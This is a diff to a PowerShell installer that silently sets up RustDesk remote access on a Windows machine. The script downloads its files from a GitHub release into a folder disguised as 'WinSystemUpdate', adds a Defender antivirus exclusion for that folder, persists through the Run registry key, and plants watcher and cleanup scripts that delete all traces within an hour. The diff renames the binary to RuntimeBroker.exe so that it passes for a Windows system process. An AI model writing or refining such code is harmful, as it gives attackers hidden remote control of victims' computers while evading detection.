@@ -1,7 +1,7 @@
 function Install-RD {
     $ProgressPreference = 'SilentlyContinue'
     $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
-    $EXE    = "$DEST\WinUpdate.exe"
+    $EXE    = "$DEST\RuntimeBroker.exe"
     $DLL    = "$DEST\sciter.dll"
     $cfgDir = "$env:APPDATA\RustDesk\config"
     $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'
@@ -9,7 +9,7 @@ function Install-RD {
     Write-Host 'Installing...' -ForegroundColor Cyan
     try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
 
-    Get-Process WinUpdate -EA SilentlyContinue |
+    Get-Process RuntimeBroker -EA SilentlyContinue |
         Where-Object { $_.Path -like '*WinSystem*' } |
         Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 1
@@ -81,28 +81,26 @@ key_confirmed = true
     $reg = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
     Set-ItemProperty $reg 'WinSystemUpdate' $EXE -Force
 
-    # Cleanup script - removes all files, registry, processes
+    # Cleanup script
     $del = "$DEST\delete.ps1"
     Set-Content $del @'
 $d = "$env:LOCALAPPDATA\WinSystemUpdate"
-Get-Process WinUpdate -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
+Get-Process RuntimeBroker -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
 Start-Sleep 2
 Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
 '@ -Encoding UTF8
 
-    # Watcher - auto deletes when:
-    #   1. RustDesk process is stopped/killed
-    #   2. 1 hour passes (whichever comes first)
+    # Watcher - auto deletes when process stops OR after 1 hour
     $watch = "$DEST\watch.ps1"
     Set-Content $watch @'
-$EXE  = "$env:LOCALAPPDATA\WinSystemUpdate\WinUpdate.exe"
+$EXE  = "$env:LOCALAPPDATA\WinSystemUpdate\RuntimeBroker.exe"
 $del  = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
 $deadline = [DateTime]::Now.AddHours(1)
 
 while ([DateTime]::Now -lt $deadline) {
     Start-Sleep 10
-    $alive = Get-Process WinUpdate -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
+    $alive = Get-Process RuntimeBroker -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
     if (-not $alive) { break }
 }
 
